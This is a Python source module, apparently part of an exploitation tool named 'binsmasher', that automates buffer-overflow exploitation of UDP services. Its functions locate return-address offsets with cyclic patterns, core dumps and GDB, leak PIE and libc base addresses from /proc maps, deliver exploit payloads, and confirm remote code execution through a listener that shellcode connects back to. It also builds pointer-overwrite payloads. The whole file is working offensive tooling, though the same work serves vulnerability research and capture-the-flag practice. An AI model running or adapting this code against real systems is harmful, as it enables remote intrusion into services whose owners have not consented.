"""UDP offset detection, exploit delivery and raw payload sender methods for Fuzzer."""
import os
import re
import socket
import time
import subprocess
import logging
from utils._process import no_core_preexec, core_preexec, set_core_pattern, cleanup_cores, CORE_DIR

log = logging.getLogger("binsmasher")


class UDPMixin:
    """Methods: find_offset_udp_payload, deliver_exploit_udp, send_raw_payload,
       build_ptr_overwrite_exploit, _build_udp_payload, _wait_for_udp_port,
       _find_inject_field."""

    @staticmethod
    def _find_inject_field(data: bytes) -> tuple:
        PLACEHOLDER = b"{PAYLOAD}"
        idx = data.find(PLACEHOLDER)
        if idx != -1:
            return idx, 4096, 0x41
        best_start, best_len, best_byte = 0, 0, 0x41
        i = 0
        while i < len(data):
            j = i + 1
            while j < len(data) and data[j] == data[i]:
                j += 1
            run_len = j - i
            if run_len >= 16 and run_len > best_len:
                best_start, best_len, best_byte = i, run_len, data[i]
            i = j
        return best_start, best_len, best_byte

    @staticmethod
    def _wait_for_udp_port(host: str, port: int, timeout: float = 5.0) -> bool:
        probe = b"\x00"
        deadline = time.time() + timeout
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.4)
        responded = False
        while time.time() < deadline:
            try:
                sock.sendto(probe, (host, port))
                sock.recvfrom(512)
                responded = True
                break
            except socket.timeout:
                time.sleep(0.15)
            except Exception:
                time.sleep(0.15)
        sock.close()
        if not responded:
            time.sleep(1.0)
        return True

    @staticmethod
    def _build_udp_payload(template: bytes, inject: bytes) -> bytes:
        PLACEHOLDER = b"{PAYLOAD}"
        if PLACEHOLDER in template:
            crafted = template.replace(PLACEHOLDER, inject, 1)
        else:
            best = None
            for m in re.finditer(rb"(.)\1{15,}", template):
                if best is None or len(m.group(0)) > len(best.group(0)):
                    best = m
            if best:
                inj = inject + bytes([best.group(1)[0]]) * max(0, len(best.group(0)) - len(inject))
                crafted = template[:best.start()] + inj[:len(best.group(0))] + template[best.end():]
            else:
                crafted = template + inject
        sep = b"\r\n\r\n"
        if sep in crafted and b"Content-Length:" in crafted:
            hdr_part, body_part = crafted.split(sep, 1)
            body_len = len(body_part)
            new_hdr = re.sub(
                rb"(Content-Length:[ \t]*)\d+",
                lambda m: m.group(1) + str(body_len).encode(),
                hdr_part,
                flags=re.IGNORECASE,
            )
            crafted = new_hdr + sep + body_part
        return crafted

    def find_offset_udp_payload(self,
                                payload_template: bytes,
                                binary: str,
                                binary_args: list,
                                host: str = None,
                                port: int = None,
                                pattern_size_start: int = 64,
                                target_function: str = None,
                                max_attempts: int = 12) -> tuple:
        import resource
        import re as _re_local
        from pwn import cyclic, cyclic_find, context

        _host = host or self.host
        _port = port or self.port

        # ── Core dump setup: all cores go to CORE_DIR, never in CWD ──────────
        set_core_pattern(CORE_DIR + "/core.%e.%p")
        _use_placeholder = b"{PAYLOAD}" in payload_template
        if _use_placeholder:
            inj_start, inj_len, inj_byte = 0, 0, 0x41
            log.info("Injection mode: {PAYLOAD} placeholder detected — "
                     "cyclic will be injected at {PAYLOAD} position with Content-Length recalculated")
        else:
            log.warning(
                "{PAYLOAD} placeholder NOT found in template. "
                "Likely shell expanded it as empty variable when passed inside $() "
                "with double quotes. Write template to a file and use: "
                "--payload-data $(cat template.txt)"
            )
            inj_start, inj_len, inj_byte = self._find_inject_field(payload_template)
            if inj_len < 8:
                log.warning(
                    f"find_offset_udp_payload: injection field too short ({inj_len}B). "
                    "Add a long repeating field or use {PAYLOAD} placeholder."
                )
            log.info(
                f"Injection field detected: offset={inj_start} len={inj_len} "
                f"byte=0x{inj_byte:02x} ('{chr(inj_byte) if 32 <= inj_byte < 127 else '?'}')"
            )

        # cores go to CORE_DIR (set above via set_core_pattern)
        # core pattern already configured

        found_offset = None
        found_addr = None
        first_crash_sz = None

        # ── Phase 1: binary search for minimum crash size ──────────────────────
        log.info("Phase 1: searching minimum crash size (8→128 bytes)…")
        _min_crash_sz = None
        _max_safe_sz = 0
        for _probe_sz in [64, 128, 192, 256, 320, 384, 512, 640, 768, 1024]:
            _pat_probe = bytes(cyclic(_probe_sz))
            if _use_placeholder:
                _crafted_probe = self._build_udp_payload(payload_template, _pat_probe)
            else:
                if len(_pat_probe) < inj_len:
                    _inj_probe = _pat_probe + bytes([inj_byte]) * (inj_len - len(_pat_probe))
                else:
                    _inj_probe = _pat_probe[:inj_len]
                _crafted_probe = (payload_template[:inj_start]
                                  + _inj_probe
                                  + payload_template[inj_start + inj_len:])
            try:
                _pp = subprocess.Popen(
                    [binary] + binary_args,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=core_preexec,
                )
                self._wait_for_udp_port(_host, _port, timeout=5.0)
                _sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                _sock.settimeout(2.0)
                _sock.sendto(_crafted_probe, (_host, _port))
                _sock.close()
                try:
                    _pp.wait(timeout=6)
                    _rc = _pp.returncode if hasattr(_pp, "returncode") else _pp.poll()
                    _is_real_crash = _rc is not None and _rc < 0
                    if _rc is None or _rc == 0:
                        log.debug(f"  Phase 1: clean exit (rc={_rc}) at {_probe_sz}B — not a crash")
                        _max_safe_sz = _probe_sz
                        try:
                            _pp.kill()
                        except Exception:
                            pass
                    elif not _is_real_crash:
                        log.debug(
                            f"  Phase 1: application error exit (rc={_rc}) at {_probe_sz}B — "
                            f"not a signal crash. Target rejected input normally. "
                            f"Ensure your payload template reaches the vulnerable code path."
                        )
                        _max_safe_sz = _probe_sz
                        try:
                            _pp.kill()
                        except Exception:
                            pass
                    else:
                        _min_crash_sz = _probe_sz
                        _sig_names = {-11: "SIGSEGV", -6: "SIGABRT", -7: "SIGBUS", -4: "SIGILL", -8: "SIGFPE"}
                        _sname = _sig_names.get(_rc, f"signal {-_rc}")
                        log.info(f"  Phase 1: crash at {_probe_sz}B (rc={_rc} {_sname}) — overflow below this size")
                        try:
                            _pp.kill()
                        except Exception:
                            pass
                        break
                except Exception:
                    log.debug(f"  Phase 1: no crash at {_probe_sz}B")
                    _max_safe_sz = _probe_sz
                    try:
                        _pp.kill()
                        _pp.wait(timeout=1)
                    except Exception:
                        pass
            except Exception as _e:
                log.debug(f"  Phase 1 probe {_probe_sz}: {_e}")

        if _min_crash_sz is None:
            log.info(f"  Phase 1: no crash up to 1024B → offset > 1024, "
                     f"using pattern_size_start={pattern_size_start}")
        else:
            log.info(f"  Phase 1: crash range {_max_safe_sz}B–{_min_crash_sz}B → "
                     f"real offset is within that range")
            _lo, _hi = _max_safe_sz, _min_crash_sz
            while _hi - _lo > 8:
                _mid = (_lo + _hi) // 2
                if _use_placeholder:
                    _probe_mid = self._build_udp_payload(payload_template, bytes(cyclic(_mid)))
                else:
                    _inj_mid = bytes(cyclic(_mid))
                    if len(_inj_mid) < inj_len:
                        _inj_mid = _inj_mid + bytes([inj_byte]) * (inj_len - len(_inj_mid))
                    else:
                        _inj_mid = _inj_mid[:inj_len]
                    _probe_mid = (payload_template[:inj_start]
                                  + _inj_mid
                                  + payload_template[inj_start + inj_len:])
                try:
                    _pp2 = subprocess.Popen([binary] + binary_args,
                                            stdin=subprocess.PIPE,
                                            stdout=subprocess.DEVNULL,
                                            stderr=subprocess.DEVNULL,
                                            preexec_fn=core_preexec)
                    self._wait_for_udp_port(_host, _port, timeout=5.0)
                    _s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    _s2.settimeout(2.0)
                    _s2.sendto(_probe_mid, (_host, _port))
                    _s2.close()
                    try:
                        _pp2.wait(timeout=6)
                        _rc2 = _pp2.returncode
                        if _rc2 is not None and _rc2 < 0:
                            _hi = _mid
                            log.debug(f"  Bisect: signal crash at {_mid}B (rc={_rc2}) → hi={_hi}")
                        else:
                            _lo = _mid
                            log.debug(f"  Bisect: no signal crash at {_mid}B → lo={_lo}")
                    except subprocess.TimeoutExpired:
                        _lo = _mid
                        log.debug(f"  Bisect: alive at {_mid}B → lo={_lo}")
                        try:
                            _pp2.kill()
                            _pp2.wait(timeout=2)
                        except Exception:
                            pass
                except Exception as _be:
                    log.debug(f"  Bisect error at {_mid}B: {_be}")
                    break
            _min_crash_sz = _hi
            pattern_size_start = _hi
            self._last_min_crash_sz = _hi
            self._last_bisect_lo = _lo
            self._last_bisect_hi = _hi
            log.info(f"  Bisect complete: minimum crash at {_min_crash_sz}B "
                     f"(overflow offset ~{_min_crash_sz - 8}–{_min_crash_sz})")
            if _min_crash_sz <= 8:
                log.info("  Crash at ≤8B detected — running automated GDB analysis to "
                         "determine crash type (stack vs heap)…")
                _gdb_result = self._auto_gdb_crash_analysis(
                    binary=binary,
                    binary_args=binary_args,
                    crash_payload=self._build_udp_payload(
                        payload_template, bytes(cyclic(64))
                    ) if _use_placeholder else (
                        payload_template[:inj_start]
                        + bytes(cyclic(64))
                        + payload_template[inj_start + inj_len:]
                    ),
                    host=_host,
                    port=_port,
                )
                if _gdb_result:
                    log.info(f"  GDB crash analysis:\n{_gdb_result}")
                    import re as _re
                    _off_m = _re.search(r"cyclic_find offset: *(\d+)", _gdb_result)
                    if _off_m:
                        _gdb_offset = int(_off_m.group(1))
                        log.info(f"  ✓ Exact offset from GDB: {_gdb_offset}")
                        found_offset = _gdb_offset
                        _pie_base = getattr(self, "_udp_pie_base", None)
                        return found_offset, _pie_base, target_function

        for attempt in range(1, max_attempts + 1):
            sz = pattern_size_start * attempt
            pat = cyclic(sz)
            pat_bytes = bytes(pat)
            if _use_placeholder:
                crafted = self._build_udp_payload(payload_template, pat_bytes)
            else:
                if len(pat_bytes) < inj_len:
                    inject = pat_bytes + bytes([inj_byte]) * (inj_len - len(pat_bytes))
                else:
                    inject = pat_bytes[:inj_len]
                crafted = self._build_udp_payload(payload_template, inject)

            log.info(f"  [attempt {attempt}/{max_attempts}] cyclic size={sz} → payload {len(crafted)}B")

            try:
                p = subprocess.Popen(
                    [binary] + binary_args,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=core_preexec,
                )
            except Exception as e:
                log.error(f"  Could not spawn binary: {e}")
                break

            _pie_base = None
            _bin_basename = os.path.basename(binary)
            try:
                maps_path = f"/proc/{p.pid}/maps"
                with open(maps_path) as _mf:
                    for _line in _mf:
                        if _bin_basename in _line and ("r-xp" in _line or "r--p" in _line):
                            _addr = _line.split("-")[0].strip()
                            _pie_base = int(_addr, 16)
                            log.info(f"  PIE base: {hex(_pie_base)} (from /proc/{p.pid}/maps)")
                            break
                if _pie_base is None:
                    with open(maps_path) as _mf2:
                        for _line in _mf2:
                            if "r-xp" in _line:
                                _pie_base = int(_line.split("-")[0].strip(), 16)
                                log.info(f"  PIE base (first r-xp segment): {hex(_pie_base)}")
                                break
            except Exception as _e:
                log.debug(f"  Could not read PIE base: {_e}")

            _libc_base = None
            try:
                with open(f"/proc/{p.pid}/maps") as _mf3:
                    for _line in _mf3:
                        if ("libc.so" in _line or "libc-" in _line) and "r-xp" in _line:
                            _libc_base = int(_line.split("-")[0].strip(), 16)
                            log.info(f"  libc base (PID {p.pid}): {hex(_libc_base)}")
                            break
            except Exception:
                pass

            if not hasattr(self, "_pid_maps"):
                self._pid_maps = {}
            if _pie_base is not None:
                self._udp_pie_base = _pie_base
                self._pid_maps[p.pid] = {"pie": _pie_base, "libc": _libc_base}
            if _libc_base is not None:
                self._udp_libc_base = _libc_base

            self._wait_for_udp_port(_host, _port, timeout=5.0)

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2.0)
                sock.sendto(crafted, (_host, _port))
                try:
                    resp, _ = sock.recvfrom(4096)
                    log.debug(f"  UDP response: {resp[:80]!r}")
                except socket.timeout:
                    log.debug("  No immediate UDP response — possible crash")
                finally:
                    sock.close()
            except Exception as e:
                log.warning(f"  Error sending UDP: {e}")
                try:
                    p.kill()
                except Exception:
                    pass
                continue

            crashed = False
            try:
                p.wait(timeout=6)
                rc = p.returncode
                if rc is None or rc == 0:
                    log.debug(f"  Process exited cleanly (rc={rc}) with cyclic({sz}) — not a crash")
                    continue
                if rc > 0:
                    log.debug(
                        f"  Process application error exit (rc={rc}) with cyclic({sz}) — "
                        f"NOT a signal crash. Target rejected input normally. "
                        f"Ensure your payload template reaches the vulnerable code path."
                    )
                    continue
                _snames = {-11: "SIGSEGV", -6: "SIGABRT", -7: "SIGBUS", -4: "SIGILL", -8: "SIGFPE"}
                log.info(f"  ✓ Process crashed with cyclic({sz}) "
                         f"(rc={rc} {_snames.get(rc, f'signal {-rc}')})")
                crashed = True
            except subprocess.TimeoutExpired:
                log.debug(f"  Process still alive with cyclic({sz}) — pattern too small")
                try:
                    p.kill()
                    p.wait(timeout=2)
                except Exception:
                    pass
                continue

            if not crashed:
                continue

            if first_crash_sz is None:
                first_crash_sz = sz

            got_exact = False
            time.sleep(0.5)
            try:
                import glob as _glob
                _cwd = CORE_DIR
                _pid_s = str(p.pid)
                _now = time.time()
                _pid_cores = (
                    _glob.glob(f"{_cwd}/core.{_pid_s}") +
                    _glob.glob(f"{_cwd}/core.*{_pid_s}*") +
                    _glob.glob(f"/tmp/core.{_pid_s}") +
                    _glob.glob(f"/tmp/core.*{_pid_s}*")
                )
                _generic_core = []
                if not _pid_cores:
                    _g = os.path.join(CORE_DIR, "core")
                    if (os.path.exists(_g) and
                            os.path.getsize(_g) > 1000 and
                            _now - os.path.getmtime(_g) < 5):
                        _generic_core = [_g]
                        log.info(f"  Using generic 'core' (no PID match, age "
                                 f"{_now - os.path.getmtime(_g):.1f}s < 5s)")
                core_files = sorted(
                    list(dict.fromkeys(_pid_cores + _generic_core)),
                    key=lambda f: os.path.getmtime(f) if os.path.exists(f) else 0,
                    reverse=True
                )
                log.info(f"  Core search PID={_pid_s}: {len(core_files)} candidate(s): "
                         f"{core_files[:3]}")
                core_path = core_files[0] if core_files else None
                if core_path and os.path.getsize(core_path) > 0:
                    log.debug(f"  Reading corefile: {core_path}")
                    try:
                        from pwn import Corefile
                        core = Corefile(core_path)
                        pc = (getattr(core, "pc", None) or
                              getattr(core, "rip", None) or
                              getattr(core, "eip", None))
                        if pc:
                            off = cyclic_find(pc & 0xffffffff)
                            if off != -1:
                                log.info(f"  ✓ Exact offset via corefile: {off}  RIP={hex(pc)}")
                                found_offset = off
                                found_addr = pc
                                if _pie_base is not None:
                                    self._udp_pie_base = _pie_base
                                got_exact = True
                            else:
                                log.debug(f"  corefile RIP={hex(pc)} not in cyclic pattern")
                        else:
                            log.debug("  corefile: no PC/RIP register found")
                    except Exception as _ce:
                        log.debug(f"  corefile parse error: {_ce}")
                else:
                    log.debug("  No corefile found — run: ulimit -c unlimited && "
                              "Use set_core_pattern() or run as root to redirect cores")
            except Exception as e:
                log.debug(f"  corefile lookup error: {e}")

            if got_exact:
                break

            log.info(f"  First crash at cyclic({sz}) — extracting exact RIP…")

            _rip_from_core = self._extract_rip_from_coredumpctl(binary, p.pid)
            if _rip_from_core is not None:
                _off = cyclic_find(_rip_from_core & 0xffffffff)
                if _off != -1:
                    log.info(f"  ✓ coredumpctl: exact offset = {_off} (RIP={hex(_rip_from_core)})")
                    found_offset = _off
                    found_addr = _rip_from_core
                    if _pie_base is not None:
                        self._udp_pie_base = _pie_base
                    break
                else:
                    log.info(f"  coredumpctl RIP={hex(_rip_from_core)} — not in cyclic, "
                             f"scanning stack for cyclic overwrite…")
                    self._last_coredump_rip = _rip_from_core
                    _core_files = sorted(
                        [f for f in __import__("glob").glob(f"/tmp/core.{p.pid}") +
                         __import__("glob").glob("/tmp/core.*")
                         if __import__("os").path.exists(f) and
                         __import__("os").path.getmtime(f) > __import__("time").time() - 30],
                        key=__import__("os").path.getmtime, reverse=True
                    )
                    if _core_files:
                        _stack_off = self._find_offset_from_core_stack(_core_files[0], sz)
                        if _stack_off != -1:
                            log.info(f"  ✓ Stack scan: exact offset = {_stack_off}")
                            found_offset = _stack_off
                            self._last_stack_scan_offset = _stack_off
                            if _pie_base is not None:
                                self._udp_pie_base = _pie_base
                            break

            _crash_payload = crafted
            _gdb_out = self._auto_gdb_crash_analysis(
                binary=binary, binary_args=binary_args,
                crash_payload=_crash_payload, host=_host, port=_port,
            )
            if _gdb_out and "===CRASH_START===" in _gdb_out:
                _rip_match = _re_local.search(r'rip\s+0x([0-9a-fA-F]+)', _gdb_out)
                if not _rip_match:
                    _rip_match = _re_local.search(r'\$\d+\s*=\s*0x([0-9a-fA-F]+)', _gdb_out)
                if _rip_match:
                    _rip_val = int(_rip_match.group(1), 16)
                    _off = cyclic_find(_rip_val & 0xffffffff)
                    if _off != -1:
                        log.info(f"  ✓ GDB: exact offset = {_off} (RIP={hex(_rip_val)})")
                        found_offset = _off
                        found_addr = _rip_val
                        if _pie_base is not None:
                            self._udp_pie_base = _pie_base
                        break
                    else:
                        log.warning(f"  GDB RIP={hex(_rip_val)} not in cyclic pattern")

            if _pie_base is not None:
                log.info(f"  No corefile/GDB — brute-forcing exact offset in "
                         f"[{_max_safe_sz}, {sz}] (step=1)…")
                _found_brute = self._brute_offset_udp(
                    payload_template=payload_template,
                    binary=binary,
                    binary_args=binary_args,
                    host=_host, port=_port,
                    lo=_max_safe_sz, hi=sz, step=1,
                    pie_base=_pie_base,
                    use_placeholder=_use_placeholder,
                    inj_start=inj_start, inj_len=inj_len, inj_byte=inj_byte,
                )
                if _found_brute is not None:
                    found_offset = _found_brute
                    if _pie_base is not None:
                        self._udp_pie_base = _pie_base
                    break

            break

        if found_offset is None and first_crash_sz is not None:
            word = 8 if context.arch == "amd64" else 4
            if _min_crash_sz is not None and _max_safe_sz > 0:
                found_offset = max(8, _max_safe_sz)
                log.warning(
                    f"Estimated offset range: {found_offset}–{_min_crash_sz - word}B. "
                    f"Crash between {_max_safe_sz}B and {_min_crash_sz}B of pattern. "
                    f"Confirm with GDB: gdb -q {binary}"
                )
            elif _min_crash_sz is not None and _max_safe_sz == 0:
                found_offset = 8
                log.warning(
                    f"Crash at 8B → early overflow (heap overflow or pointer corruption). "
                    f"Stack offset may differ. Confirm with GDB."
                )
            else:
                found_offset = max(8, first_crash_sz - word)
                log.warning(
                    f"Heuristic offset: {found_offset} (first crash at cyclic({first_crash_sz})). "
                    f"Core dumps unavailable — run: ulimit -c unlimited and retry."
                )

        if found_offset is None:
            log.error(
                "find_offset_udp_payload: could not determine offset.\n"
                "  • Verify core dumps are enabled: ulimit -c unlimited\n"
                "  • Verify the cyclic pattern reaches RIP (the injection field may not\n"
                "    injection field may be past the overflow point — adjust manually)\n"
                f"  • Injection field: template[{inj_start}:{inj_start + inj_len}] "
                f"({inj_len}B of 0x{inj_byte:02x})"
            )
            return None, None, target_function

        pie_base = getattr(self, "_udp_pie_base", None)
        libc_base = getattr(self, "_udp_libc_base", None)
        for _attr in ("_udp_pie_base", "_udp_libc_base"):
            if hasattr(self, _attr):
                delattr(self, _attr)
        if pie_base:
            log.info(f"Process PIE base:  {hex(pie_base)}")
        if libc_base:
            log.info(f"Process libc base: {hex(libc_base)}")
            self._last_libc_base = libc_base
        return found_offset, pie_base, target_function

    def deliver_exploit_udp(self, payload_template: bytes, exploit_payload: bytes,
                             binary: str, binary_args: list,
                             startup_wait: float = 2.5,
                             verify_host: str = "127.0.0.1",
                             verify_port: int = 0,
                             _existing_proc=None) -> bool:
        crafted = self._build_udp_payload(payload_template, exploit_payload)
        log.info(f"deliver_exploit_udp: {len(crafted)}B (exploit={len(exploit_payload)}B)")

        srv = _existing_proc
        if srv is None and os.path.isfile(binary):
            try:
                srv = subprocess.Popen([binary] + binary_args,
                                       stdin=subprocess.PIPE,
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL,
                                       preexec_fn=no_core_preexec)
                log.debug(f"  PID={srv.pid}")
                self._wait_for_udp_port(self.host, self.port, timeout=startup_wait + 3)
            except Exception as e:
                log.error(f"  Could not start binary: {e}")
                return False

        _listener_sock = None
        _rce_confirmed = False
        _rce_output = b""
        if verify_port > 0:
            try:
                _listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _listener_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                _listener_sock.bind((verify_host, verify_port))
                _listener_sock.listen(1)
                _listener_sock.settimeout(6.0)
                log.info(f"  TCP listener on {verify_host}:{verify_port} waiting for connection…")
            except Exception as e:
                log.warning(f"  Could not open TCP listener: {e}")
                _listener_sock = None

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(4.0)
            sock.sendto(crafted, (self.host, self.port))
            log.info(f"  Exploit sent via UDP ({len(crafted)}B)")
            try:
                resp, _ = sock.recvfrom(4096)
                log.info(f"  Target response: {resp[:80]!r}")
            except socket.timeout:
                log.debug("  No immediate UDP response")
            finally:
                sock.close()

            if _listener_sock:
                try:
                    conn, addr = _listener_sock.accept()
                    _rce_output = conn.recv(4096)
                    conn.close()
                    _rce_confirmed = True
                    log.info(f"  ✓ RCE CONFIRMED — connection from {addr}")
                    log.info(f"  Command output: {_rce_output.decode(errors='replace').strip()}")
                except socket.timeout:
                    log.warning("  No connection to listener — shellcode did not execute")
                finally:
                    _listener_sock.close()

            if srv:
                time.sleep(1.5)
                _exit_rc = srv.poll()
                if _exit_rc is not None:
                    if _rce_confirmed:
                        log.info("  ✓ Process terminated AND RCE confirmed — exploit successful")
                        return True
                    if _exit_rc < 0:
                        _snames = {-11: "SIGSEGV", -6: "SIGABRT", -7: "SIGBUS", -4: "SIGILL", -8: "SIGFPE"}
                        log.warning(f"  Process crashed (rc={_exit_rc} "
                                    f"{_snames.get(_exit_rc, f'signal {-_exit_rc}')}) "
                                    f"but RCE not confirmed — crash without RIP control or "
                                    f"wrong offset/address")
                    else:
                        log.debug(f"  Process exited normally (rc={_exit_rc}) — "
                                  f"payload did not trigger a crash")
                    return False
                else:
                    if _rce_confirmed:
                        log.info("  ✓ RCE confirmed (process alive — shellcode ran in a thread)")
                        return True
                    log.debug("  Process still alive — payload did not overwrite return address")
                    return False
            return _rce_confirmed
        except Exception as e:
            log.error(f"  Error: {e}")
            return False
        finally:
            if srv and srv is not _existing_proc:
                try:
                    if srv.poll() is None:
                        srv.terminate()
                        srv.wait(timeout=3)
                except Exception:
                    pass

    def send_raw_payload(self, payload: bytes, use_udp: bool = False) -> bool:
        transport = "UDP" if use_udp else "TCP"
        log.info(f"[send_raw_payload] {len(payload)}B → {self.host}:{self.port} [{transport}]")
        try:
            if use_udp:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3.0)
                sock.sendto(payload, (self.host, self.port))
                log.info(f"  UDP datagram sent ({len(payload)}B)")
                try:
                    resp, addr = sock.recvfrom(4096)
                    log.info(f"  UDP response ({len(resp)}B) from {addr}:\n  {resp[:300]!r}")
                except socket.timeout:
                    log.warning("  No UDP response (timeout 3s) — "
                                "normal if the target crashed or is not responding")
                finally:
                    sock.close()
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)
                sock.connect((self.host, self.port))
                sock.sendall(payload)
                sock.shutdown(socket.SHUT_WR)
                resp = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        resp += chunk
                except socket.timeout:
                    pass
                finally:
                    sock.close()
                if resp:
                    log.info(f"  TCP response ({len(resp)}B):\n  {resp[:300]!r}")
                else:
                    log.warning("  No TCP response — "
                                "possible target crash or connection closed without data")
            log.info("  Payload sent successfully")
            return True
        except ConnectionRefusedError:
            log.error(f"  Connection refused at {self.host}:{self.port} — is the target running?")
            return False
        except OSError as e:
            log.error(f"  Socket error: {e}")
            return False
        except Exception as e:
            log.error(f"  Unexpected error: {e}")
            return False

    def build_ptr_overwrite_exploit(self,
                                     payload_template: bytes,
                                     ptr_offset: int,
                                     write_addr: int,
                                     write_data: bytes,
                                     min_crash_size: int = 0) -> bytes:
        import struct
        ptr_bytes = struct.pack("<Q", write_addr)
        inject = b"A" * ptr_offset + ptr_bytes + write_data
        if min_crash_size and len(inject) < min_crash_size:
            inject = inject + b"\x00" * (min_crash_size - len(inject))
        log.info(f"ptr-overwrite: write {len(write_data)}B to {hex(write_addr)} "
                 f"(ptr_offset={ptr_offset}, total={len(inject)}B)")
        return self._build_udp_payload(payload_template, inject)